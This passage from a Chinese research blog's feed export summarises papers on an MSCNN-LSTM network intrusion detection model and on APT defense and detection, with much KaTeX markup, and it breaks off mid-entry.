class="katex-mathml"><math><semantics><mrow><msup><mi>c</mi><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">c^t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7935559999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span></span></span></span></span></span></span>（cell state）和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>h</mi><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">h^t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7935559999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span></span></span></span></span></span></span>（hidden state）。其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>c</mi><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">c^t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7935559999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span></span></span></span></span></span></span>改变得很慢，通常输出的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>c</mi><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">c^t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7935559999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span></span></span></span></span></span></span>是上一个状态传过来的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>c</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">c^{t-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>加上一些数值。而<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>h</mi><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">h^t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7935559999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span></span></span></span></span></span></span>则在不同节点下往往会有很大的区别.</p><ul><li>首先使用LSTM的当前输入<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">x^t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7935559999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span></span></span></span></span></span></span>和上一个状态传递下来的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>h</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">h^{t-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>拼接训练得到四个状态：</li></ul><p><img src="https://pic4.zhimg.com/80/v2-15c5eb554f843ec492579c6d87e1497b_720w.jpg" alt="" /></p><p>其中，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>z</mi><mi>f</mi></msup></mrow><annotation encoding="application/x-tex">z^f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10764em;">f</span></span></span></span></span></span></span></span></span></span></span>、<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>z</mi><mi>i</mi></msup></mrow><annotation encoding="application/x-tex">z^i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.824664em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span></span></span>、<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>z</mi><mi>o</mi></msup></mrow><annotation encoding="application/x-tex">z^o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">o</span></span></span></span></span></span></span></span></span></span></span>是由拼接向量乘以权重矩阵之后，再通过一个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>i</mi><mi>g</mi><mi>m</mi><mi>o</mi><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">sigmoid</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span></span></span></span>激活函数转换成0到1之间的数值，来作为一种门控状态。而<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>z</mi></mrow><annotation encoding="application/x-tex">z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span></span></span></span>则是将结果通过一个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>a</mi><mi>n</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">tanh</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">h</span></span></span></span>激活函数将转换成-1到1之间的值（这里使用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>a</mi><mi>n</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">tanh</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">h</span></span></span></span>是因为这里是将其做为输入数据，而不是门控信号）。</p><ul><li><strong>下面开始进一步介绍这四个状态在LSTM内部的使用</strong></li></ul><p><img src="https://pic2.zhimg.com/80/v2-556c74f0e025a47fea05dc0f76ea775d_720w.jpg" alt="" /></p><p>其中，<img src="https://www.zhihu.com/equation?tex=%5Codot" alt="" /> 是Hadamard Product，也就是操作矩阵中对应的元素相乘，因此要求两个相乘矩阵是同型的。 <img src="https://www.zhihu.com/equation?tex=%5Coplus" alt="" /> 则代表进行矩阵加法。</p><p>LSTM主要有三个阶段：</p><ul><li><kbd>忘记阶段</kbd></li></ul><p>这个阶段主要是对上一个节点传进来的输入进行<strong>选择性</strong>忘记。简单来说就是会 “忘记不重要的，记住重要的”。具体来说是通过计算得到的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>z</mi><mi>f</mi></msup></mrow><annotation encoding="application/x-tex">z^f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10764em;">f</span></span></span></span></span></span></span></span></span></span></span>（f表示forget）来作为忘记门控，来控制上一个状态的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>c</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">c^{t-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>哪些需要留哪些需要忘。</p><ul><li><kbd>选择记忆阶段</kbd></li></ul><p>这个阶段将这个阶段的输入有选择性地进行“记忆”，会对输入<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">x^t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7935559999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span></span></span></span></span></span></span>进行选择记忆。哪些重要则着重记录下来，哪些不重要，则少记一些。当前的输入内容由前面计算得到的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>z</mi></mrow><annotation encoding="application/x-tex">z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span></span></span></span>表示。而选择的门控信号则是由<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>z</mi><mi>i</mi></msup></mrow><annotation encoding="application/x-tex">z^i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.824664em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span></span></span>（i代表information）来进行控制。</p><blockquote><p>将上面两步得到的结果相加，即可得到传输给下一个状态的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>c</mi><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">c^t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7935559999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span></span></span></span></span></span></span>，也就是上图中的第一个公式。</p></blockquote><ul><li><kbd>输出阶段</kbd></li></ul><p>这个阶段将决定哪些将会被当成当前状态的输出。主要是通过<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>z</mi><mi>o</mi></msup></mrow><annotation encoding="application/x-tex">z^o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">o</span></span></span></span></span></span></span></span></span></span></span>来进行控制的。并且还对上一阶段得到的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>c</mi><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">c^t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7935559999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span></span></span></span></span></span></span>进行了放缩（通过一个tanh激活函数进行变化）。</p><p>与普通RNN类似，输出<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>y</mi><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">y^t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9879959999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span></span></span></span></span></span></span>往往最终也是通过<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>h</mi><mi>t</mi></msup></mrow><annotation encoding="application/x-tex">h^t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7935559999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span></span></span></span></span></span></span>变化得到的</p><h2 id="36-池化层"><a class="markdownIt-Anchor" href="#36-池化层"></a> 3.6 池化层</h2><p>池化的目的是减少训练参数，加快网络训练速度，其主要作用是执行<strong>下采样</strong>（down-sampling）。通过池化可以降低模型的过拟合，提高模型的泛化能力。池化包括两种：</p><ul><li><strong>最大值池化</strong>（max-pooling）：通过subsample数据，主要选择那些具有更好的分类和标识的特征，因此总的来说，其效果比较好</li><li><strong>均值池化</strong>（mean-pooling）</li></ul><p>但是特征提取的误差主要来自于两方面：由于邻域大小的限制，估计值的方差增大；卷积层参数的误差导致估计值的偏差。均值池化可以缓解第一种，最大值池化可以缓解第二种。</p><blockquote><p>即均值池化可以保留更多的背景特征信息，它强调整体的特征信息；而最大值池化可以保留更多的纹理特征信息，它强调局部的重点。</p></blockquote><p>因此均值池化在信息的完全传递中会更有用，而使用最大值池化会丢失许多特征信息。因此<strong>本文选用均值池化</strong>。</p><h2 id="37-模型反馈"><a class="markdownIt-Anchor" href="#37-模型反馈"></a> 3.7 模型反馈</h2><p>模型在CNN中使用反向传播算法（back propagation：BP）。</p><ul><li><strong>残差网络</strong>（<strong>Residual Network</strong>，<strong>ResNet</strong>）</li></ul><p>随着神经网络层数的加深，会产生梯度爆炸（激活值变为无穷大）和梯度消失（激活值变为无穷小）问题。残差网络通过<strong>跳跃连接</strong>，将前面的激活值跳过中间的网络层，直接传递到更后面的网络层中去，以此来避免梯度消失和梯度爆炸。从而<strong>使得训练更深层次的神经网络成为可能</strong>。</p><h1 id="4-实验"><a class="markdownIt-Anchor" href="#4-实验"></a> 4 实验</h1><h2 id="41-实验数据"><a class="markdownIt-Anchor" href="#41-实验数据"></a> 4.1 实验数据</h2><p>训练集中包含175341条数据，测试集中包含82332条数据。采样需要遵循<strong>大样本平均采样</strong>和<strong>小样本完整采样</strong>的原则。 通过采样获得的测试集为Test_Set_A。 下表中显示了每个数据集中的异常行为类别和分布。</p><p><img src="https://s2.ax1x.com/2020/03/08/3xUvFK.png" alt="" /></p><p>为了进一步测试模型的泛化能力，这项工作中使用了一个新的测试集Test_Set_B。 观察数据集，我们可以发现网络流量的正常行为大约占总流量的三分之一，而罕见的攻击类别“Worms”和“Shellcode”仅占很小的比例。因此，在Test_Set_B中，“Worms”和“Shellcode”类型的比例有所增加。 下表展示了测试集Test_Set_B的具体分布：</p><p><img src="https://s2.ax1x.com/2020/03/08/3xa9QH.png" alt="" /></p><h2 id="42-实验过程"><a class="markdownIt-Anchor" href="#42-实验过程"></a> 4.2 实验过程</h2><p>每个MS卷积层使用三种不同大小的卷积核，padding方法使用“same padding”，损失函数使用“Categorical_crossentropy function”，优化器使用“AdamOptimizer”，权重和偏移量使用0均值的高斯初始化。</p><p>使用dropout来避免过拟合，其连接概率p在通过实验探索后选取p=0.5</p><h2 id="43-实验度量"><a class="markdownIt-Anchor" href="#43-实验度量"></a> 4.3 实验度量</h2><p><img src="https://s2.ax1x.com/2020/03/08/3xaefS.png" alt="" /></p><h2 id="44-实验结果"><a class="markdownIt-Anchor" href="#44-实验结果"></a> 4.4 实验结果</h2><p>设置了三个对照实验：</p><p><img src="https://s2.ax1x.com/2020/03/08/3xaGkV.png" alt="" /></p><p>下图比较了在罕见攻击情况下这四个模型的检测能力。检测罕见攻击情况的重点是减少误报率</p><p><img src="https://s2.ax1x.com/2020/03/08/3xadX9.png" alt="" /></p><h1 id="5-总结"><a class="markdownIt-Anchor" href="#5-总结"></a> 5 总结</h1><ul><li>尽管使用神经网络不需要太多的关注特征工程，但是在面对众多的特征时，需要进行进一步的特征选择</li><li>现实中，恶意软件流量相对于正常流量来说占比很小，而且不同而已流量所占的比例也不同，因此提高模型的泛化能力是关键</li><li>学习点：MSCNN-LSTM集成模型</li></ul>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科研 </tag>
            
            <tag> 入侵检测 </tag>
            
            <tag> 神经网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PaperNote-一种情报驱动的安全感知APT防御机制</title>
      <link href="/2020/02/26/PaperNote-%E4%B8%80%E7%A7%8D%E6%83%85%E6%8A%A5%E9%A9%B1%E5%8A%A8%E7%9A%84%E5%AE%89%E5%85%A8%E6%84%9F%E7%9F%A5APT%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6/"/>
      <url>/2020/02/26/PaperNote-%E4%B8%80%E7%A7%8D%E6%83%85%E6%8A%A5%E9%A9%B1%E5%8A%A8%E7%9A%84%E5%AE%89%E5%85%A8%E6%84%9F%E7%9F%A5APT%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>原文标题：An Intelligence-Driven Security-Aware Defense Mechanism for Advanced Persistent Threats</p><p>原文作者：Yuqing Li, Wenkuan Dai, Jie Bai, Xiaoying Gan, Member, IEEE, Jingchao Wang, and Xinbing Wang, Senior<br />Member, IEEE</p><p>原文来源：TIFS 2018</p><p>原文链接：<a href="https://ieeexplore.ieee.org/abstract/document/8386813" target="_blank" rel="noopener">https://ieeexplore.ieee.org/abstract/document/8386813</a></p><p>这是一篇偏向于理论的文章，其中有非常多的公式，较为抽象，因此仅总结了文章的主要思路。</p><h1 id="1-摘要"><a class="markdownIt-Anchor" href="#1-摘要"></a> 1 摘要</h1><p>现今的安全防护工作，要么着眼于一次性的攻击事件，要么将检测和响应策略分离开。如此一来会忽略APT攻击的持久性和风险异质性（risk heterogeneity，不同类别的风向）。因此，本问题提出了<strong>以威胁情报为支撑的</strong>、<strong>基于李雅普诺夫（Lyapunov-based）的安全感之防御机制</strong>，其鲁棒性的防御策略指定来源于异质性知识。</p><p>本文提出的机制，在理论上可以证明其具有有限的队列积压、收益最优、无下溢情况、对检测误差具有鲁棒性。</p><h1 id="2-简介"><a class="markdownIt-Anchor" href="#2-简介"></a> 2 简介</h1><p>集成了检测和响应能力之后，情报驱动的安全防护将会是一种有效的方法，威胁情报包括威胁环境、影响和动机等。</p><p>许多安全防护领域的核心问题是如何进行高效率的安全资源分配，从攻防对抗的角度来看，资源分配问题可以放在博弈论的背景下，通过相互的战略行为分析，为有效的防御决策提供建议。</p><p>另一个研究重点是风险管理。使用攻击图或攻击树之类的表现形式，防御者可以根据网络状态之间的因果关系评估风险，并进一步确定最低成本的防御措施。</p><h2 id="21-挑战及应对措施"><a class="markdownIt-Anchor" href="#21-挑战及应对措施"></a> 2.1 挑战及应对措施</h2><p>本文主要解决了以下两个挑战：</p><ul><li>动态、长时间响应</li><li>安全感知响应：即优先响应高风险的攻击。除了攻击概率这样的风险异质性，还有别的吗？</li></ul><p>为此，本文提出了<strong>基于李雅普诺夫的情报驱动防御机制</strong>，以实现长期的安全感知响应。考虑具有N个独立主机，一个攻击者和一个防御者。在威胁情报的支持下，我们构建了一个攻击图，该攻击图建模了攻防对抗。受到FlipIt Game的启发，每个对抗结果都会随着攻击图的变化而显现，其中每个玩家都可以通过支付费用来控制目标主机。从防御者的角度来看，整个系统的利润是解决攻击所获得的防御效用与所产生的防御成本之差。最后的目标是实现“长期收益最大化”。</p><ul><li><p><strong>优先级感知的虚拟队列</strong>（priority-aware virtual queues）：用于计算风险随时间的演变，它与攻击队列一起，为队列优化提供了主机异质性的融合。</p></li><li><p><strong>风险准入控制策略</strong>（tolerable risk admission control policy）：为了适应主机的风险承受能力，避免资源浪费。设定一个阈值，当主机的风险等级较低时，新的攻击事件可以被加入待响应事件中；若主机的风险等级较高时，表明当前的风险已经超过了主机的处理能力，将会禁止新的攻击事件加入待响应事件中。</p></li><li><p><strong>防御控制策略</strong>（defense control policy）：两步决策</p><ul><li>使用基于拍卖的分布式分配算法，攻击事件竞争响应机会，高风险的受攻击主机（high-risk，host-attack）具有较高的优先级</li><li>然后在获胜的攻击事件之间按比例分配公平的资源</li></ul></li></ul><h2 id="22-主要贡献"><a class="markdownIt-Anchor" href="#22-主要贡献"></a> 2.2 主要贡献</h2><p>（1）从攻击和风险等级两个角度来进行安全感知，提出了基于李雅普诺夫的、情报驱动的防御机制</p><p>（2）在威胁情报的支持下，将攻防对抗过程建模为动态攻击图。</p><p>（3）将该防御机制应用于由Cyberxingan开发的基于机器学习的异常检测系统中进行验证。</p><h1 id="3-系统设计"><a class="markdownIt-Anchor" href="#3-系统设计"></a> 3 系统设计</h1><p>系统设计的三个步骤是：检测、响应（重点）、状态更新，下图可以形象地理解本文提出的机制：</p><p><img src="https://s2.ax1x.com/2020/02/26/3aDtvd.png" alt="" /></p>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科研 </tag>
            
            <tag> APT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PaperNote-分析大量网络流量以进行APT检测</title>
      <link href="/2020/02/21/PaperNote-%E5%88%86%E6%9E%90%E5%A4%A7%E9%87%8F%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E4%BB%A5%E8%BF%9B%E8%A1%8CAPT%E6%A3%80%E6%B5%8B/"/>
      <url>/2020/02/21/PaperNote-%E5%88%86%E6%9E%90%E5%A4%A7%E9%87%8F%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E4%BB%A5%E8%BF%9B%E8%A1%8CAPT%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<p>原文标题：Analysis of high volumes of network traffic for Advanced Persistent Threat detection</p><p>原文作者：Mirco Marchetti, Fabio Pierazzi∗, Michele Colajanni, Alessandro Guido  Department of Engineering “Enzo Ferrari”, University of Modena and Reggio Emilia, Italy</p><p>原文来源：Computer Networks 2016</p><p>原文链接：<a href="https://fabio.pierazzi.com/papers/pierazzi_apt.pdf" target="_blank" rel="noopener">https://fabio.pierazzi.com/papers/pierazzi_apt.pdf</a></p><h1 id="1-摘要"><a class="markdownIt-Anchor" href="#1-摘要"></a> 1 摘要</h1><p>本文提出的方法可以通过分析大量的网络流量，揭示与APT的数据窃取或其它可疑行为相关的弱信号。最终的结果是呈现一个对网络内部主机的排名，从而安全分析人员可以将注意力放在少数几个可以主机上。</p><h1 id="2-简介"><a class="markdownIt-Anchor" href="#2-简介"></a> 2 简介</h1><h2 id="21-研究现状"><a class="markdownIt-Anchor" href="#21-研究现状"></a> 2.1 研究现状</h2><ul><li>传统的安全方案是基于<strong>模式匹配</strong>的，但这种方法只能检测已知攻击，但对于经常利用未知漏洞、标准协议和加密通信的APT来说难以奏效。</li><li>现存的<strong>流量分析技术</strong>只能够检测普通的攻击（如DDos），但是由于APT攻击者会模拟正常行为、仅入侵有限数量的主机，所以能够避免被检测到。</li><li>在大型的网络系统中，其产生的报警数量是非常庞大的，而且基于主机的日志（如系统调用）的收集和分析也会非常昂贵，因此本文着眼于网络流量进行分析</li></ul><h2 id="22-研究目标"><a class="markdownIt-Anchor" href="#22-研究目标"></a> 2.2 研究目标</h2><p>注意，本文的研究目标不在于非常明确的值除哪台主机被攻击了。而是在一个具有上千台主机的环境中，能够挖掘出少数几台具有可疑行为的主机。</p><h2 id="23-方法和贡献"><a class="markdownIt-Anchor" href="#23-方法和贡献"></a> 2.3 方法和贡献</h2><p>本文提出的框架能过够收集并分析大量的流量，检测与数据窃取相对应的APT活动的关键阶段。通过检查每个主机的过去，并将其与其他主机进行比较，来评估每个主机的可以移动和位置。 最终输出是主机的排名列表，安全分析人员可以将其注意力集中在top-k可疑主机上。</p><p><strong>效率提升</strong>：通过分析网络流（network flow）而不是原始的流量数据</p><p><strong>可扩展性</strong>：由于不需要监视数据载荷（payload），该方法甚至能工作在加密的通信中</p><p>主要贡献如下：</p><ul><li>描述了真实大型网络环境中的网络统计数据，并定义了一个模型，旨在检测APT相关活动，并特别关注数据窃取；</li><li>定义了一系列算法，通过评估多维特征空间中主机随时间的移动和位置，对疑似APT的活动进行打分</li><li>设计并实施了一个prototype，将其应用于一个包含10K台主机的环境中</li></ul><h1 id="3-相关工作"><a class="markdownIt-Anchor" href="#3-相关工作"></a> 3 相关工作</h1><p>我们的方法是，将基于与已知APT知识的<strong>启发式</strong>方法，和能够捕获可疑网络活动的<strong>行为统计模型</strong>相结合。</p><p>基于现在的研究情况，我们可以从下面三个方面来考虑。</p><h2 id="31-apt检测"><a class="markdownIt-Anchor" href="#31-apt检测"></a> 3.1 APT检测</h2><p>分析APT案例、提出形式化描述（7-phase、攻击金字塔）、基于图分析、异常检测系统、数据窃取检测</p><h2 id="32-僵尸网络检测"><a 